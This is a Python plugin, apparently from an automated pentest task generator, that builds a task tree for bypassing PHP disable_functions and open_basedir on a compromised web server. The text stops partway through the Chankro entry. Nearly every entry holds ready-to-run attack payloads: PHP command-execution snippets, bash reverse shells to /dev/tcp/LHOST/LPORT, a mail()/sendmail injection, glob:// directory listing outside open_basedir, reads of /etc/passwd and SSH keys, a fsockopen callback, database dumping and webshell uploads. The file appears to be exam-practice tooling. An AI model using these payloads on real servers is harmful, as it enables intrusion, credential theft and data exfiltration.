"""
PHP disable_functions and open_basedir bypass techniques

Generates tasks for bypassing PHP security restrictions when webshell
access is obtained but system command execution is blocked.

Techniques included:
- Command execution function enumeration
- open_basedir bypass methods
- disable_functions bypass (LD_PRELOAD, FastCGI, dl function, etc.)
- Alternative execution methods when standard functions are blocked
- PHP capabilities for enumeration without command execution

Extracted from HackTricks: php-useful-functions-disable_functions-open_basedir-bypass
Generated by: CrackPot v1.0 - HackTricks Mining Agent
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class PHPBypassPlugin(ServicePlugin):
    """PHP security bypass techniques for disable_functions and open_basedir"""

    @property
    def name(self) -> str:
        return "php-bypass"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect HTTP services running PHP
        Note: This plugin should be manually triggered when PHP webshell access is obtained
        """
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        port = port_info.get('port')

        # Check for HTTP services (PHP context)
        if any(svc in service for svc in self.service_names):
            return True

        if port in self.default_ports:
            return True

        # Check for PHP in product/version info
        if 'php' in product:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate PHP bypass enumeration task tree"""

        tasks = {
            'id': f'php-bypass-{port}',
            'name': f'PHP Security Bypass Techniques (Port {port})',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: Initial Reconnaissance
        tasks['children'].append({
            'id': f'php-recon-{port}',
            'name': 'PHP Environment Reconnaissance',
            'type': 'parent',
            'children': [
                {
                    'id': f'phpinfo-check-{port}',
                    'name': 'Check phpinfo() for Configuration',
                    'type': 'manual',
                    'metadata': {
                        'command': '<?php phpinfo(); ?>',
                        'description': 'Display complete PHP configuration including disable_functions and open_basedir',
                        'flag_explanations': {
                            'phpinfo()': 'Outputs information about PHP configuration, modules, environment'
                        },
                        'success_indicators': [
                            'Full PHP configuration displayed',
                            'disable_functions directive visible',
                            'open_basedir setting shown',
                            'Loaded extensions listed'
                        ],
                        'failure_indicators': [
                            'phpinfo() itself is disabled',
                            'Function not found error'
                        ],
                        'next_steps': [
                            'Identify which command execution functions are disabled',
                            'Check open_basedir restrictions',
                            'Note PHP version for version-specific exploits',
                            'Identify loaded modules (pcntl, FFI, etc.)'
                        ],
                        'alternatives': [
                            'php -i (CLI if shell access available)',
                            'Check php.ini file directly if readable',
                            'Use ini_get("disable_functions") and ini_get("open_basedir")'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN', 'RECON'],
                        'notes': 'CRITICAL FIRST STEP: Understand restrictions before attempting bypass'
                    }
                },
                {
                    'id': f'function-test-{port}',
                    'name': 'Test Available Command Execution Functions',
                    'type': 'manual',
                    'metadata': {
                        'command': '<?php $functions = ["exec", "passthru", "system", "shell_exec", "popen", "proc_open", "pcntl_exec", "mail", "putenv"]; foreach($functions as $f) { echo $f . ": " . (function_exists($f) && !in_array($f, explode(",", ini_get("disable_functions"))) ? "AVAILABLE" : "DISABLED") . "\\n"; } ?>',
                        'description': 'Enumerate which PHP command execution functions are available',
                        'flag_explanations': {
                            'function_exists()': 'Check if function is defined in PHP',
                            'ini_get("disable_functions")': 'Retrieve disabled functions list from configuration'
                        },
                        'success_indicators': [
                            'List of available vs disabled functions',
                            'At least one execution function available',
                            'mail() or putenv() available (for LD_PRELOAD bypass)'
                        ],
                        'failure_indicators': [
                            'All execution functions disabled',
                            'Script fails to execute'
                        ],
                        'next_steps': [
                            'If any function available: Use it for command execution',
                            'If mail/putenv available: Try LD_PRELOAD bypass',
                            'If all disabled: Proceed to advanced bypass techniques'
                        ],
                        'alternatives': [
                            'Manual testing: <?php echo system("id"); ?>',
                            'Try backticks: <?php echo `id`; ?>',
                            'Test proc_open separately (complex syntax)'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN', 'ENUM'],
                        'notes': 'Focus on AVAILABLE functions first before complex bypasses'
                    }
                }
            ]
        })

        # PHASE 2: Command Execution Function Testing
        tasks['children'].append({
            'id': f'php-exec-functions-{port}',
            'name': 'PHP Command Execution Functions',
            'type': 'parent',
            'children': [
                {
                    'id': f'exec-test-{port}',
                    'name': 'Test exec() Function',
                    'type': 'manual',
                    'metadata': {
                        'command': '<?php exec("id", $output); print_r($output); ?>',
                        'description': 'Execute command via exec() - returns last line only',
                        'flag_explanations': {
                            'exec()': 'Executes external program, returns last line of output',
                            '$output': 'Array to store command output (all lines)'
                        },
                        'success_indicators': [
                            'Command output displayed',
                            'User/group IDs shown'
                        ],
                        'failure_indicators': [
                            'exec is disabled error',
                            'No output returned'
                        ],
                        'next_steps': [
                            'Use exec() for all enumeration commands',
                            'Upload reverse shell script',
                            'Execute privilege escalation tools'
                        ],
                        'alternatives': [
                            '<?php system("id"); ?> - Full output immediately',
                            '<?php echo shell_exec("id"); ?> - Returns full output as string',
                            '<?php passthru("id"); ?> - Raw output directly to browser'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'notes': 'exec() requires print_r($output) to see results'
                    }
                },
                {
                    'id': f'system-test-{port}',
                    'name': 'Test system() Function',
                    'type': 'manual',
                    'metadata': {
                        'command': '<?php system("id"); ?>',
                        'description': 'Execute command via system() - direct output to browser',
                        'flag_explanations': {
                            'system()': 'Executes command and outputs directly to browser, returns last line'
                        },
                        'success_indicators': [
                            'Command output immediately visible',
                            'Clean output formatting'
                        ],
                        'failure_indicators': [
                            'system is disabled',
                            'No output'
                        ],
                        'next_steps': [
                            'Use system() for interactive commands',
                            'Chain multiple commands with &&',
                            'Test reverse shell: system("bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'")'
                        ],
                        'alternatives': [
                            '<?php passthru("id"); ?> - Similar direct output',
                            '<?php echo shell_exec("id"); ?> - String output',
                            'Backticks: <?php echo `id`; ?>'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN']
                    }
                },
                {
                    'id': f'shell-exec-test-{port}',
                    'name': 'Test shell_exec() and Backticks',
                    'type': 'manual',
                    'metadata': {
                        'command': '<?php echo shell_exec("id"); ?>',
                        'description': 'Execute command via shell_exec() - returns full output as string',
                        'flag_explanations': {
                            'shell_exec()': 'Executes command via shell, returns complete output as string',
                            'Backticks `cmd`': 'Shorthand for shell_exec(), identical behavior'
                        },
                        'success_indicators': [
                            'Full command output captured',
                            'Multi-line output preserved'
                        ],
                        'failure_indicators': [
                            'shell_exec is disabled',
                            'NULL returned'
                        ],
                        'next_steps': [
                            'Use for commands with multi-line output',
                            'Capture enumeration results to parse',
                            'Test: <?php echo `uname -a`; ?>'
                        ],
                        'alternatives': [
                            'Backticks identical: <?php echo `id`; ?>',
                            'exec() with output array',
                            'proc_open() for full control'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN']
                    }
                },
                {
                    'id': f'proc-open-test-{port}',
                    'name': 'Test proc_open() Function',
                    'type': 'manual',
                    'metadata': {
                        'command': '<?php $descriptors = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open("id", $descriptors, $pipes); if (is_resource($process)) { echo stream_get_contents($pipes[1]); proc_close($process); } ?>',
                        'description': 'Execute command via proc_open() - full control over stdin/stdout/stderr',
                        'flag_explanations': {
                            'proc_open()': 'Execute command with full I/O control (stdin/stdout/stderr)',
                            '$descriptors': 'Array defining pipe configuration for each stream',
                            'array("pipe", "r")': 'Create readable pipe for stdin',
                            'array("pipe", "w")': 'Create writable pipe for stdout/stderr'
                        },
                        'success_indicators': [
                            'Process opened successfully',
                            'is_resource($process) returns true',
                            'Output captured from stdout pipe'
                        ],
                        'failure_indicators': [
                            'proc_open is disabled',
                            'Process creation failed'
                        ],
                        'next_steps': [
                            'Use for interactive commands requiring input',
                            'Capture both stdout and stderr separately',
                            'Execute long-running processes'
                        ],
                        'alternatives': [
                            'popen() for simpler single-stream pipe',
                            'shell_exec() if full control not needed',
                            'pcntl_exec() if pcntl extension loaded'
                        ],
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ADVANCED'],
                        'notes': 'Most flexible but complex syntax. Often bypasses restrictions when simpler functions fail'
                    }
                },
                {
                    'id': f'pcntl-exec-test-{port}',
                    'name': 'Test pcntl_exec() Function',
                    'type': 'manual',
                    'metadata': {
                        'command': '<?php pcntl_exec("/bin/bash", ["-c", "id"]); ?>',
                        'description': 'Execute program via pcntl_exec() - requires pcntl extension',
                        'flag_explanations': {
                            'pcntl_exec()': 'Execute external program in current process space (pcntl extension)',
                            '/bin/bash': 'Program to execute',
                            '"-c"': 'Bash flag to execute command from string',
                            'pcntl extension': 'Process Control extension, not loaded by default'
                        },
                        'success_indicators': [
                            'Command executes',
                            'pcntl extension loaded (check phpinfo)'
                        ],
                        'failure_indicators': [
                            'pcntl_exec is disabled or not loaded',
                            'Function does not exist',
                            'Extension not installed'
                        ],
                        'next_steps': [
                            'Check if pcntl.so module available: <?php echo extension_loaded("pcntl"); ?>',
                            'If available: Use for reverse shells',
                            'pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"])'
                        ],
                        'alternatives': [
                            'Load pcntl.so via dl() if possible',
                            'Use standard exec/system functions',
                            'Try proc_open() for process control'
                        ],
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ADVANCED'],
                        'notes': 'Requires pcntl extension loaded. Check with: php -m | grep pcntl'
                    }
                },
                {
                    'id': f'mail-abuse-{port}',
                    'name': 'Abuse mail() Function for Command Execution',
                    'type': 'manual',
                    'metadata': {
                        'command': '<?php file_put_contents("/tmp/cmd.sh", "#!/bin/sh\\nid > /tmp/output.txt"); chmod("/tmp/cmd.sh", 0777); mail("", "", "", "", "-H \\"exec /tmp/cmd.sh\\""); echo file_get_contents("/tmp/output.txt"); ?>',
                        'description': 'Abuse mail() $options parameter to inject commands via sendmail',
                        'flag_explanations': {
                            'mail()': 'Sends email via sendmail binary, accepts arbitrary options',
                            '"-H"': 'Sendmail flag to execute command',
                            'exec': 'Execute command via sendmail -H option',
                            'file_put_contents()': 'Write command to shell script',
                            'chmod()': 'Make script executable'
                        },
                        'success_indicators': [
                            'Shell script created successfully',
                            'mail() executes without error',
                            'Command output appears in /tmp/output.txt'
                        ],
                        'failure_indicators': [
                            'mail() disabled',
                            'Cannot write to /tmp',
                            'sendmail not installed or configured'
                        ],
                        'next_steps': [
                            'Execute reverse shell via mail()',
                            'Use for blind command execution',
                            'Check output files for results'
                        ],
                        'alternatives': [
                            'mb_send_mail() if php-mbstring installed',
                            'Use LD_PRELOAD bypass with mail()',
                            'Try other functions that call external binaries'
                        ],
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ADVANCED'],
                        'notes': 'Output not directly visible. Write results to file and read back.'
                    }
                }
            ]
        })

        # PHASE 3: open_basedir Bypass Techniques
        tasks['children'].append({
            'id': f'open-basedir-bypass-{port}',
            'name': 'open_basedir Bypass Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'glob-bypass-{port}',
                    'name': 'Bypass open_basedir with glob:// Protocol',
                    'type': 'manual',
                    'metadata': {
                        'command': '<?php $it = new DirectoryIterator("glob:///e??/*"); foreach($it as $f) { echo $f . "<br>"; } ?>',
                        'description': 'List directories outside open_basedir using glob:// protocol with wildcards',
                        'flag_explanations': {
                            'glob://': 'Stream wrapper that bypasses open_basedir checks',
                            'DirectoryIterator': 'Iterator for directory traversal',
                            '/e??/*': 'Wildcard pattern matching /etc/* and similar paths',
                            '??': 'Wildcard matching exactly 2 characters'
                        },
                        'success_indicators': [
                            'Directory contents outside open_basedir listed',
                            '/etc/ contents visible',
                            'No open_basedir restriction errors'
                        ],
                        'failure_indicators': [
                            'open_basedir restriction error',
                            'Empty result set',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Enumerate /etc/ for sensitive configs: glob:///e??/p*',
                            'Search for SSH keys: glob:///h??/*/.*',
                            'Find world-writable directories',
                            'Locate config files with credentials'
                        ],
                        'alternatives': [
                            'glob:///v??/run/* for /var/run/',
                            'glob:///v??/log/* for /var/log/',
                            'Use FastCGI bypass for full filesystem access',
                            'Try symlink traversal techniques'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'notes': 'LIMITATION: Can list directories but not read file contents. Combine with other techniques.'
                    }
                },
                {
                    'id': f'fastcgi-basedir-bypass-{port}',
                    'name': 'Full open_basedir Bypass via FastCGI/PHP-FPM',
                    'type': 'manual',
                    'metadata': {
                        'command': 'Upload FastCGI client exploit to communicate with unix socket at /var/run/php-fpm.sock',
                        'description': 'Completely bypass open_basedir by communicating directly with PHP-FPM socket',
                        'flag_explanations': {
                            'PHP-FPM': 'FastCGI Process Manager - alternative PHP execution method',
                            'Unix socket': 'IPC mechanism, usually at /var/run/php-fpm.sock or /var/run/php/php7.x-fpm.sock',
                            'FastCGI protocol': 'Binary protocol for web server <-> PHP communication',
                            'PHP_VALUE': 'FastCGI parameter to override PHP configuration including open_basedir'
                        },
                        'success_indicators': [
                            'PHP-FPM socket found (usually /var/run/)',
                            'FastCGI client connects successfully',
                            'Commands execute outside open_basedir',
                            'Full filesystem access obtained'
                        ],
                        'failure_indicators': [
                            'PHP-FPM not running',
                            'Socket not found or not accessible',
                            'Connection refused'
                        ],
                        'next_steps': [
                            'First: Locate socket with glob:///v??/run/* bypass',
                            'Upload FCGIClient PHP class',
                            'Set PHP_VALUE to override: allow_url_include=On, open_basedir=/, auto_prepend_file=php://input',
                            'Execute arbitrary PHP via FastCGI'
                        ],
                        'alternatives': [
                            'If no PHP-FPM: Try other bypass methods',
                            'Exploit via Gopherus tool',
                            'Use LD_PRELOAD if mail() available',
                            'Try /proc/self/mem bypass'
                        ],
                        'tags': ['OSCP:HIGH', 'ADVANCED', 'MANUAL'],
                        'notes': 'POWERFUL: Bypasses BOTH open_basedir AND disable_functions. Requires PHP-FPM configured.',
                        'estimated_time': '15-30 minutes'
                    }
                }
            ]
        })

        # PHASE 4: disable_functions Bypass Techniques
        tasks['children'].append({
            'id': f'disable-funcs-bypass-{port}',
            'name': 'disable_functions Bypass Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'ld-preload-bypass-{port}',
                    'name': 'LD_PRELOAD Bypass (mail/mb_send_mail)',
                    'type': 'manual',
                    'metadata': {
                        'command': 'Use Chankro or compile custom .so library with malicious getuid()',
                        'description': 'Bypass disable_functions by preloading malicious shared library via LD_PRELOAD',
                        'flag_explanations': {
                            'LD_PRELOAD': 'Linux env variable to load shared libraries before all others',
                            'mail()': 'Triggers sendmail binary execution - can be hijacked',
                            'mb_send_mail()': 'Alternative mail function if php-mbstring installed',
                            'putenv()': 'Required to set LD_PRELOAD environment variable',
                            'getuid()': 'Common libc function called by binaries, can be hooked',
                            'Chankro': 'Automated tool to generate LD_PRELOAD exploits'
                        },
                        'success_indicators': [
                            'mail() and putenv() not disabled',
                            'Writable directory available for .so library',
                            'Custom library loaded successfully',
                            'Reverse shell or command execution achieved'
                        ],
                        'failure_indicators': [
                            'mail() or putenv() disabled',
                            'Cannot write files to disk',
                            'LD_PRELOAD ignored or blocked',
                            'Binary does not call hooked function'
                        ],
                        'next_steps': [
                            'Generate exploit with Chankro: python2 chankro.py --arch 64 --input shell.sh --path /tmp --output exploit.php',
                            'Upload exploit.php and access it',
                            'Check for reverse shell connection',
                            'Alternative functions: mb_send_mail, imap_mail, imagick, gnupg_init'
                        ],
                        'alternatives': [
                            'mb_send_mail() if php-mbstring module present',
                            'imap_mail() if php-imap installed',
                            'imagick class constructor (version < 3.3.0)',
                            'Manual .so compilation with custom getuid()',
                            'Try other binaries: gnupg_init, libvirt_connect'
                        ],
                        'tags': ['OSCP:HIGH', 'ADVANCED', 'MANUAL'],
                        'notes': 'CHECK: mail/putenv not in disable_functions. TECHNIQUE: Hooks libc functions to execute payload.',
                        'estimated_time': '20-30 minutes'
                    }
                },
                {
                    'id': f'dl-function-bypass-{port}',
                    'name': 'dl() Function Extension Loading',
                    'type': 'manual',
                    'metadata': {
                        'command': 'Compile custom PHP extension with bypass_exec() function',
                        'description': 'Load custom PHP extension via dl() to bypass disable_functions',
                        'flag_explanations': {
                            'dl()': 'Dynamically load PHP extension (.so file) at runtime',
                            'PHP extension': 'C/C++ shared library that adds functions to PHP',
                            'ZEND_MODULE_API_NO': 'Zend API version - must match PHP version exactly',
                            'extension_dir': 'Directory where PHP looks for extensions (from phpinfo)',
                            'PHP_FUNCTION': 'Macro to define callable PHP function in C'
                        },
                        'success_indicators': [
                            'dl() function exists and not disabled',
                            'Write access to extension_dir (unlikely)',
                            'Compiled extension matches PHP API version',
                            'Custom function successfully loaded and callable'
                        ],
                        'failure_indicators': [
                            'dl() disabled',
                            'No write access to extension_dir',
                            'API version mismatch',
                            'Compilation failed'
                        ],
                        'next_steps': [
                            'Check dl() available: <?php echo function_exists("dl"); ?>',
                            'Get extension_dir: <?php echo ini_get("extension_dir"); ?>',
                            'Check API: php -i | grep "Zend Extension Build"',
                            'Compile bypass.so with matching API version',
                            'Upload to extension_dir (VERY RARE to have write access)'
                        ],
                        'alternatives': [
                            'LD_PRELOAD bypass (more practical)',
                            'FastCGI bypass',
                            'Version-specific exploits',
                            '/proc/self/mem technique'
                        ],
                        'tags': ['OSCP:LOW', 'ADVANCED', 'MANUAL'],
                        'notes': 'IMPRACTICAL: Requires write access to extension_dir (almost never available). Historical technique.',
                        'estimated_time': '60+ minutes'
                    }
                },
                {
                    'id': f'fastcgi-disable-funcs-{port}',
                    'name': 'FastCGI/PHP-FPM disable_functions Bypass',
                    'type': 'manual',
                    'metadata': {
                        'command': 'Use FCGIClient to communicate with PHP-FPM and override disable_functions',
                        'description': 'Bypass disable_functions by setting empty disable_functions via FastCGI PHP_VALUE',
                        'flag_explanations': {
                            'PHP-FPM': 'FastCGI Process Manager handling PHP requests',
                            'PHP_VALUE parameter': 'FastCGI parameter to set PHP configuration',
                            'disable_functions=""': 'Attempt to clear disabled functions list',
                            'auto_prepend_file': 'PHP file auto-included before script execution'
                        },
                        'success_indicators': [
                            'PHP-FPM socket accessible',
                            'FastCGI connection established',
                            'PHP_VALUE parameters accepted',
                            'Previously disabled functions now callable'
                        ],
                        'failure_indicators': [
                            'PHP-FPM not running',
                            'Socket not accessible',
                            'disable_functions cannot be overridden (ini_set limitation)',
                            'Connection refused'
                        ],
                        'next_steps': [
                            'Locate PHP-FPM socket (glob:///v??/run/php*)',
                            'Upload FCGIClient class',
                            'Set PHP_VALUE with: disable_functions=, open_basedir=/',
                            'NOTE: disable_functions override may not work (ini file only)',
                            'Focus on open_basedir bypass instead'
                        ],
                        'alternatives': [
                            'LD_PRELOAD bypass (more reliable)',
                            'Version-specific exploits',
                            'mod_cgi .htaccess technique',
                            '/proc/self/mem memory manipulation'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ADVANCED', 'MANUAL'],
                        'notes': 'WARNING: Overriding disable_functions via PHP_VALUE often fails. Better for open_basedir bypass.',
                        'estimated_time': '15-30 minutes'
                    }
                },
                {
                    'id': f'mod-cgi-bypass-{port}',
                    'name': 'mod_cgi + .htaccess Bypass',
                    'type': 'manual',
                    'metadata': {
                        'command': 'Create .htaccess with "Options +ExecCGI" and shell script with CGI handler',
                        'description': 'Bypass PHP restrictions by executing shell script as CGI',
                        'flag_explanations': {
                            'mod_cgi': 'Apache module for CGI script execution',
                            'Options +ExecCGI': '.htaccess directive to enable CGI in directory',
                            'AddHandler cgi-script': 'Define file extension as CGI executable',
                            '.htaccess': 'Per-directory Apache configuration file',
                            'AllowOverride': 'Apache setting allowing .htaccess (must be enabled)'
                        },
                        'success_indicators': [
                            'mod_cgi loaded in Apache (check apache_get_modules())',
                            'Current directory writable',
                            '.htaccess files allowed (AllowOverride)',
                            'Shell script executes as CGI'
                        ],
                        'failure_indicators': [
                            'mod_cgi not loaded',
                            'Directory not writable',
                            '.htaccess ignored (AllowOverride None)',
                            '500 Internal Server Error'
                        ],
                        'next_steps': [
                            'Check prerequisites: <?php echo in_array("mod_cgi", apache_get_modules()) ? "YES" : "NO"; ?>',
                            'Test .htaccess: file_put_contents(".htaccess", "SetEnv TEST on");',
                            'Create shell.sh: #!/bin/bash\\necho "Content-Type: text/html"\\necho\\nid',
                            'Configure .htaccess: Options +ExecCGI\\nAddHandler cgi-script .sh',
                            'chmod 755 shell.sh',
                            'Access shell.sh via browser'
                        ],
                        'alternatives': [
                            'LD_PRELOAD bypass if mod_cgi unavailable',
                            'FastCGI bypass',
                            'Try mod_fcgid if available',
                            'Upload PHP-FPM exploit'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ADVANCED', 'MANUAL'],
                        'notes': 'REQUIREMENTS: mod_cgi loaded + writable dir + .htaccess allowed. RARE in modern configs.',
                        'estimated_time': '10-15 minutes'
                    }
                },
                {
                    'id': f'proc-mem-bypass-{port}',
                    'name': '/proc/self/mem Memory Manipulation',
                    'type': 'manual',
                    'metadata': {
                        'command': 'Read PHP binary ELF, find open@plt, overwrite with system@plt address',
                        'description': 'Bypass disable_functions by rewriting function pointers in process memory',
                        'flag_explanations': {
                            '/proc/self/mem': 'Virtual file representing current process memory',
                            'open@plt': 'Procedure Linkage Table entry for open() function',
                            'system@plt': 'PLT entry for system() function',
                            'ELF parsing': 'Extract function offsets from Executable and Linkable Format',
                            'libc offsets': 'Calculate function addresses from loaded libc library'
                        },
                        'success_indicators': [
                            'Kernel >= 2.68 (check: uname -r)',
                            'PHP-CGI or PHP-FPM (not mod_php)',
                            'x64 architecture',
                            'open_basedir=off or bypassable',
                            'Read/write access to /proc/self/mem'
                        ],
                        'failure_indicators': [
                            'Kernel too old (<2.68)',
                            'mod_php architecture (no /proc/self/mem access)',
                            'x86 32-bit (exploit written for x64)',
                            'open_basedir blocks /proc/ access',
                            'Memory write protection'
                        ],
                        'next_steps': [
                            'Check prerequisites: kernel version, PHP SAPI, architecture',
                            'Parse /proc/self/maps to find libc base',
                            'Extract open/system offsets from libc ELF',
                            'Calculate addresses and overwrite open@plt',
                            'Trigger open() call - executes system() instead'
                        ],
                        'alternatives': [
                            'LD_PRELOAD bypass (simpler)',
                            'FastCGI exploit',
                            'Version-specific exploits',
                            'mod_cgi technique'
                        ],
                        'tags': ['OSCP:LOW', 'ADVANCED', 'EXPERT'],
                        'notes': 'HIGHLY ADVANCED: Requires deep understanding of ELF, memory layout, and PLT. Many prerequisites.',
                        'estimated_time': '60+ minutes'
                    }
                }
            ]
        })

        # PHASE 5: PHP Capabilities Without Command Execution
        tasks['children'].append({
            'id': f'php-capabilities-{port}',
            'name': 'PHP Enumeration Without Command Execution',
            'type': 'parent',
            'children': [
                {
                    'id': f'file-operations-{port}',
                    'name': 'PHP File Operations for Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'command': '<?php echo file_get_contents("/etc/passwd"); ?>',
                        'description': 'Use PHP file functions to read sensitive files without command execution',
                        'flag_explanations': {
                            'file_get_contents()': 'Read entire file into string',
                            'file()': 'Read file into array (one line per element)',
                            'readfile()': 'Output file directly to browser',
                            'scandir()': 'List directory contents',
                            'glob()': 'Find pathnames matching pattern'
                        },
                        'success_indicators': [
                            'File contents readable',
                            'Directory listing obtained',
                            'Sensitive data extracted'
                        ],
                        'failure_indicators': [
                            'open_basedir restriction',
                            'Permission denied',
                            'File not found'
                        ],
                        'next_steps': [
                            'Read /etc/passwd for user enumeration',
                            'Search for config files: glob("/var/www/*/config.php")',
                            'Find SSH keys: glob("/home/*/.ssh/id_rsa")',
                            'Read database configs',
                            'Extract credentials from application files'
                        ],
                        'alternatives': [
                            'fopen() + fread() for large files',
                            'file() for line-by-line processing',
                            'SplFileObject class for OOP approach',
                            'RecursiveDirectoryIterator for deep scanning'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'notes': 'POWERFUL: Even without command execution, PHP can read files and enumerate filesystem.'
                    }
                },
                {
                    'id': f'network-operations-{port}',
                    'name': 'PHP Network Operations',
                    'type': 'manual',
                    'metadata': {
                        'command': '<?php $sock = fsockopen("LHOST", LPORT); fwrite($sock, "Connected from PHP\\n"); ?>',
                        'description': 'Use PHP network functions for reverse connections and port scanning',
                        'flag_explanations': {
                            'fsockopen()': 'Open TCP/UDP socket connection',
                            'fwrite()': 'Write data to socket',
                            'fread()': 'Read data from socket',
                            'stream_socket_client()': 'Advanced socket client with SSL support'
                        },
                        'success_indicators': [
                            'Connection established to attacker',
                            'Data transmitted successfully',
                            'Reverse shell possible via pure PHP'
                        ],
                        'failure_indicators': [
                            'Connection refused',
                            'Firewall blocking outbound',
                            'fsockopen disabled'
                        ],
                        'next_steps': [
                            'Establish PHP reverse shell without exec()',
                            'Port scan internal network',
                            'Pivot through target to internal services',
                            'Exfiltrate data via HTTP POST'
                        ],
                        'alternatives': [
                            'curl_exec() for HTTP requests',
                            'file_get_contents("http://...") if allow_url_fopen=On',
                            'stream_socket_client() for advanced features',
                            'socket_create() for low-level control'
                        ],
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'PIVOTING'],
                        'notes': 'Pure PHP reverse shell possible without any exec functions. See p0wny-shell.'
                    }
                },
                {
                    'id': f'database-operations-{port}',
                    'name': 'PHP Database Access',
                    'type': 'manual',
                    'metadata': {
                        'command': '<?php $conn = new mysqli("localhost", "root", "password", "database"); $result = $conn->query("SELECT * FROM users"); while($row = $result->fetch_assoc()) { print_r($row); } ?>',
                        'description': 'Dump databases using PHP without command execution',
                        'flag_explanations': {
                            'mysqli': 'MySQL Improved extension for database access',
                            'PDO': 'PHP Data Objects - database abstraction layer',
                            'query()': 'Execute SQL query',
                            'fetch_assoc()': 'Fetch result row as associative array'
                        },
                        'success_indicators': [
                            'Database connection established',
                            'Query results returned',
                            'User data extracted'
                        ],
                        'failure_indicators': [
                            'Connection refused',
                            'Authentication failed',
                            'Database not found'
                        ],
                        'next_steps': [
                            'Find database credentials in PHP config files',
                            'Dump all tables: SHOW TABLES',
                            'Extract user hashes',
                            'Look for sensitive data',
                            'Write web shell via SELECT INTO OUTFILE'
                        ],
                        'alternatives': [
                            'PDO for multi-database support',
                            'mysql_* functions (deprecated but may exist)',
                            'pg_connect() for PostgreSQL',
                            'Use UDF for command execution if MySQL is local'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'notes': 'Database credentials often in config.php. Dump everything before attempting privilege escalation.'
                    }
                }
            ]
        })

        # PHASE 6: Automated Tools
        tasks['children'].append({
            'id': f'automated-tools-{port}',
            'name': 'Automated Bypass Discovery Tools',
            'type': 'parent',
            'children': [
                {
                    'id': f'dfunc-bypasser-{port}',
                    'name': 'dfunc-bypasser - Automated Function Testing',
                    'type': 'command',
                    'metadata': {
                        'command': f'git clone https://github.com/teambi0s/dfunc-bypasser && cd dfunc-bypasser && python3 dfunc-bypasser.py -u http://{target}:{port}/webshell.php',
                        'description': 'Automated tool to discover which bypass technique works for target',
                        'flag_explanations': {
                            'dfunc-bypasser': 'Automated disable_functions bypass discovery tool',
                            '-u': 'Target URL with webshell',
                            'Tested techniques': 'LD_PRELOAD, mail, FFI, UAF, COM, etc.'
                        },
                        'success_indicators': [
                            'Working bypass technique identified',
                            'Commands execute successfully',
                            'Exploit payload generated'
                        ],
                        'failure_indicators': [
                            'No bypass available',
                            'All techniques failed',
                            'Network connection issues'
                        ],
                        'next_steps': [
                            'Use identified technique manually',
                            'Upload generated exploit',
                            'Establish reverse shell',
                            'Begin privilege escalation'
                        ],
                        'alternatives': [
                            'Manual testing of each technique',
                            'p0wny-shell auto-detection',
                            'Bypass_Disable_functions_Shell script'
                        ],
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'TOOL'],
                        'notes': 'USEFUL: Quickly identify working bypass without manual testing. Install on Kali before exam.',
                        'estimated_time': '5-10 minutes'
                    }
                },
                {
                    'id': f'p0wny-shell-{port}',
                    'name': 'p0wny-shell - Auto-bypass Webshell',
                    'type': 'manual',
                    'metadata': {
                        'command': f'wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O shell.php && upload to http://{target}:{port}/shell.php',
                        'description': 'Feature-rich webshell with automatic disable_functions bypass attempts',
                        'flag_explanations': {
                            'p0wny-shell': 'PHP webshell with built-in bypass techniques',
                            'Auto-detection': 'Automatically tests available execution functions',
                            'Features': 'File browser, command execution, upload/download'
                        },
                        'success_indicators': [
                            'Webshell uploaded successfully',
                            'Browser-based shell interface loads',
                            'Commands execute with auto-bypass',
                            'File operations work'
                        ],
                        'failure_indicators': [
                            'Upload blocked',
                            'Webshell detected by WAF/AV',
                            'No bypass techniques available'
                        ],
                        'next_steps': [
                            'Browse filesystem',
                            'Execute enumeration commands',
                            'Upload privilege escalation tools',
                            'Establish proper reverse shell'
                        ],
                        'alternatives': [
                            'phpwebshelllimited for restricted environments',
                            'Custom minimal webshell',
                            'WSO shell (more features, bigger signature)',
                            'b374k shell (obfuscated)'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'TOOL'],
                        'notes': 'EXAM-FRIENDLY: Single file, auto-bypass attempts, good UI. Download before exam.',
                        'estimated_time': '2-5 minutes'
                    }
                },
                {
                    'id': f'chankro-{port}',
                    'name': 'Chankro - LD_PRELOAD Exploit Generator',
                    'type': 'command',
                    'metadata': {
                        'command': 'python2 /opt/Chankro/chankro.py --arch 64 --input shell.sh --path /tmp --output exploit.php',
                        'description': 'Generate ready-to-use LD_PRELOAD bypass exploit',
                        'flag_explanations': {
